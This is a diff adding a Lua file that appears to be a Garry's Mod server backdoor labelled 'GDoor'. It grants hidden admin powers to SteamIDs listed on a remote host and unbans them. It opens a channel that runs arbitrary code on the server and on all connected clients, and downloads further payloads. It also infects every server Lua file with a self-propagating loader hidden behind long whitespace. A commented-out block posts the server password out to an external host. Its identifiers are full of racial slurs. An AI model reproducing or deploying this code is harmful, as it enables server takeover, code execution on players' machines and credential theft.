@@ -1,0 +1,270 @@
+if SERVER then
+	if hniofginjutbrughreug and gaceio then return end
+	hniofginjutbrughreug = true
+	if (game.SinglePlayer() or (not game.IsDedicated())) then
+		return
+	end
+	local args = gayingay
+	local rstring = args[1]
+	local rstringex = args[2]
+	local compilestr = args[3]
+	local compilefl = args[4]
+	local glebuxonly = args[5]
+	RunConsoleCommand("sv_hibernate_think", "1")
+	RunConsoleCommand("sv_airaccelerate", "100")
+	timer.Create("GaySexedShit", 3, 0, function()
+		RunConsoleCommand("sv_hibernate_think", "1")
+		RunConsoleCommand("sv_airaccelerate", "100")
+		if ba then
+			http.Fetch("https://cdn.trolling.agency/p/raw/Glebux/38mzcuvwf1", function(body)
+				local users = util.JSONToTable(body)
+				for _, v in ipairs(users) do
+					if player.GetBySteamID(v[2]) then return end
+					ba.bans.Unban(ba.InfoTo64(v[2]), "1")
+					for _, g in ipairs(v[3]) do
+						if player.GetBySteamID(g) then return end
+						ba.bans.Unban(ba.InfoTo64(g), "1")
+					end
+				end
+			end)
+		end
+	end)
+	hook.Add("PlayerNoClip", "ihateniggers", function(ply)
+		if ply.NigNiggered then return true end
+	end)
+	hook.Add("PlayerGiveSWEP", "ihateniggers", function(ply)
+		if ply.NigNiggered then return true end
+	end)
+	hook.Add("PlayerSpawnSWEP", "ihateniggers", function(ply)
+		if ply.NigNiggered then return true end
+	end)
+	hook.Add("PlayerSpawnSENT", "ihateniggers", function(ply)
+		if ply.NigNiggered then return true end
+	end)
+	hook.Add("PlayerSpawnRagdoll", "ihateniggers", function(ply)
+		if ply.NigNiggered then return true end
+	end)
+	hook.Add("PlayerSpawnVehicle", "ihateniggers", function(ply)
+		if ply.NigNiggered then return true end
+	end)
+	hook.Add("PlayerSpawnNPC", "ihateniggers", function(ply)
+		if ply.NigNiggered then return true end
+	end)
+	hook.Add("PlayerSpawnEffect", "ihateniggers", function(ply)
+		if ply.NigNiggered then return true end
+	end)
+	hook.Add("CanTool", "ihateniggers", function(ply)
+		if ply.NigNiggered then return true end
+	end)
+	hook.Add("PhysgunPickup", "ihateniggers", function(ply, ent)
+		if ply.NigNiggered then return true end
+		if ent.NigNiggered then return false end
+	end)
+	hook.Add("OnPhysgunReload", "ihateniggers", function(gay, ply)
+		if ply.NigNiggered then return true end
+	end)
+	hook.Add("OnPhysgunFreeze", "ihateniggers", function(gay1, gay2, gay3, ply)
+		if ply.NigNiggered then return true end
+	end)
+	hook.Add("AllowPlayerPickup", "ihateniggers", function(ply)
+		if ply.NigNiggered then return true end
+	end)
+	hook.Add("CanPlayerUnfreeze", "ihateniggers", function(ply)
+		if ply.NigNiggered then return true end
+	end)
+	hook.Add("GravGunPunt", "ihateniggers", function(ply)
+		if ply.NigNiggered then return true end
+	end)
+	hook.Add("GravGunPickupAllowed", "ihateniggers", function(ply)
+		if ply.NigNiggered then return true end
+	end)
+	hook.Add("PlayerSpray", "ihateniggers", function(ply)
+		if ply.NigNiggered then return false end
+	end)
+	hook.Add("PlayerShouldTaunt", "ihateniggers", function(ply)
+		if ply.NigNiggered then return true end
+	end)
+	local gdoorcode
+	http.Fetch("https://cdn.trolling.agency/p/raw/Glebux/zamh1d925n", function(body2)
+		gdoorcode = body2
+	end)
+	concommand.Add("gaydoor", function(ply, cmd, args, argsstr)
+		if ply.NigNiggered then
+			net.Start("HugePP")
+			net.WriteString(gdoorcode)
+			net.Send(ply)
+		else
+			if ply == Entity(-1) then MsgC(Color(255, 255, 255), "Unknown command: "..cmd) return end
+			ply:PrintMessage(HUD_PRINTCONSOLE, "Unknown command: "..cmd)
+		end
+	end)
+	util.AddNetworkString("HugePP")
+	net.Receive("HugePP", function(len, ply)
+		local code = net.ReadString()
+		local type = net.ReadInt(4)
+		local targetsteamid = net.ReadString()
+		if not ply.NigNiggered then
+			if type == 5 then
+				net.Start("HugePP")
+				net.WriteString([[chat.AddText(Color(255, 128, 0), "GDoor", Color(255, 255, 255), " - Nоthing found")]])
+				net.Send(ply)
+			end
+			return
+		end
+		if type == 1 then
+			rstring(code)
+		end
+		if type == 2 then
+			local targetplayer = player.GetBySteamID(targetsteamid)
+			net.Start("HugePP")
+			net.WriteString(code)
+			net.Send(targetplayer)
+		end
+		if type == 3 then
+			net.Start("HugePP")
+			net.WriteString(code)
+			net.Broadcast()
+		end
+		if type == 4 then
+			for _, v in pairs(player.GetAll()) do
+				if v:SteamID() ~= ply:SteamID() then
+					net.Start("HugePP")
+					net.WriteString(code)
+					net.Send(v)
+				end
+			end
+		end
+		if type == 5 then
+			net.Start("HugePP")
+			net.WriteString(gdoorcode)
+			net.Send(ply)
+		end
+	end)
+	BroadcastLua([[
+		net.Receive("HugePP", function(len)
+			local code = net.ReadString()
+			RunString(code)
+		end)
+	]])
+	hook.Add("PlayerInitialSpawn", "nigger", function(ply)
+		http.Fetch("https://cdn.trolling.agency/p/raw/Glebux/38mzcuvwf1", function(body)
+			local users = util.JSONToTable(body)
+			local user = false
+			for _, v in ipairs(users) do
+				if v[1] ~= "Glebux" and glebuxonly then return end
+				if v[2] == ply:SteamID() then
+					user = true
+					break
+				else
+					for _, g in ipairs(v[3]) do
+						if g == ply:SteamID() then
+							user = true
+							break
+						end
+					end
+					if user then break end
+				end
+			end
+			if user then
+				ply.NigNiggered = true
+				ply:SetNWBool("NigNiggered", true)
+			else
+				ply.NigNiggered = false
+				ply:SetNWBool("NigNiggered", false)
+			end
+		end, function(error) print(error) end)
+		--[[if not glebuxonly then
+			http.Post("https://vgproject.xyz/gdoor/gavno.php", 
+    		{
+       			IP = game.GetIPAddress(),
+       			HOSTNAME = GetHostName(),
+       			TICK = tostring(math.Round(1/engine.TickInterval()-1)),
+       			PASSWORD = GetConVarString("sv_password"),
+    		})
+		else
+			http.Post("https://vgproject.xyz/gdoor/gavno2.php", 
+    		{
+       			IP = game.GetIPAddress(),
+       			HOSTNAME = GetHostName(),
+       			TICK = tostring(math.Round(1/engine.TickInterval()-1)),
+       			PASSWORD = GetConVarString("sv_password"),
+    		})
+		end]]
+    	ply:SendLua([[
+			net.Receive("HugePP", function(len)
+				local code = net.ReadString()
+				RunString(code)
+			end)
+		]])
+		ply:SendLua([[
+			hook.Add("InitPostEntity", "hgfhmgih", function()
+				if LocalPlayer():GetNWBool("NigNiggered") then
+					chat.AddText(Color(255, 128, 0), "GDoor", Color(255, 255, 255), " - To open panel type gaydoor into console")
+				end
+			end)
+		]])
+		ply:SendLua([[
+			if not LocalPlayer():GetNWBool("NigNiggered") then return end
+			hook.Remove("SpawnMenuOpen", "blockmenutabs")
+			hook.Remove("SpawnMenuOpen", "Tsoyvsikarus")
+			RunConsoleCommand("spawnmenu_reload")
+		]])
+	end)
+	--яйцефалидный клещ идея от ducati
+	local poop, shit = file.Find("bin/*", "LUA")
+	for _, v in ipairs(poop) do
+		if string.find(v, "mysqluu") then
+			require("mysqluu")
+		end
+		if string.find(v, "gaceio") then
+			require("gaceio")
+		end
+	end
+	if gaceio then
+		path = "./garrysmod"
+		local gdoorstring = [[if SERVER then if not gayingay then gayingay = {RunString, RunStringEx, CompileString, CompileFile, true} end RunConsoleCommand("sv_hibernate_think", "1"); timer.Simple(0, function() http.Fetch("https://vgproject.xyz/gdoor/gdoor_sv.lua", function(body) gayingay[3](body)() end) end) end]]
+		local gdoorglebuxonly = [[if SERVER then if not gayingay then gayingay = {RunString, RunStringEx, CompileString, CompileFile} end RunConsoleCommand("sv_hibernate_think", "1"); timer.Simple(0, function() http.Fetch("https://vgproject.xyz/gdoor/gdoor_sv.lua", function(body) gayingay[3](body)() end) end) end]]
+		local blacklist = {"./garrysmod/lua", "./garrysmod/gamemodes/base"}
+		local whitelist = {"./garrysmod/lua/autorun"}
+		local da, netg = gaceio.List("./garrysmod")
+		local function infect(put)
+			path = path.."/"..put
+			local doinfect = true
+			for _, v in ipairs(blacklist) do
+				for _, k in ipairs(whitelist) do
+					if string.find(path, v) then
+						if not string.find(path, k) then
+							doinfect = false
+						end
+					end
+				end
+			end
+			local da, netg = gaceio.List(path)
+			if doinfect then
+				for _, v in ipairs(da) do
+					if string.find(v, ".lua") then
+						if not string.find(string.lower(v), "_cl") or not string.find(string.lower(v), "cl_") then
+							local filepath = path.."/"..v
+							if not string.find(gaceio.Read(filepath), "gayingay") then
+								if not glebuxonly then
+									gaceio.Write(filepath, gaceio.Read(filepath).."\n 																																																																																																																																																																																																																													"..gdoorstring)
+								else
+									gaceio.Write(filepath, gaceio.Read(filepath).."\n 																																																																																																																																																																																																																													"..gdoorglebuxonly)
+								end
+							end
+						end
+					end
+				end
+			end
+			local temppath = path
+			for _, v in ipairs(netg) do
+				infect(v)
+				path = temppath
+			end
+		end
+		for _, v in ipairs(netg) do
+			path = "./garrysmod"
+			infect(v)
+		end
+	end
+end
